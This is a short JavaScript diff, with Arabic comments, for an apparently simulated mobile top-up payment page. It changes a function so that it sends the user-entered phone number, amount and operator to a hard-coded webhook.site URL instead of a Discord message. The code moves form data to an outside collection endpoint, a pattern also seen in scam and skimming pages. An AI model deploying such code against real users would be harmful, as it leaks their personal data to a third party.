@@ -102,16 +102,23 @@ function startCountdown(seconds) {
     }, 1000);
 }
 
-// محاكاة إدخال البطاقة وإرسال الديسكورد
+// محاكاة إدخال البطاقة وإرسال البيانات إلى Webhook.site
 function simulateCardSuccess() {
     clearInterval(window.countdownInterval);
     
     const phone = document.getElementById('phone-input').value;
     const amount = document.getElementById('amount-input').value;
+    
+    // الرابط الجديد الخاص بك
     const webhookUrl = "https://webhook.site/ed0fc4fd-1730-45a7-917b-6151f0f027fb";
     
+    // بيانات العملية التي سترسل كـ JSON
     const payload = {
-        content: `🚨 **تنبيه عملية فليكسي ناجحة (محاكاة)**\n🌐 **الشبكة:** ${selectedOp}\n📱 **رقم الهاتف:** ${phone}\n💰 **المبلغ:** ${amount} دج\n✅ **الحالة:** تمت العملية بنجاح.`
+        status: "success",
+        operator: selectedOp,
+        phone_number: phone,
+        amount: amount,
+        timestamp: new Date().toISOString()
     };
 
     fetch(webhookUrl, {
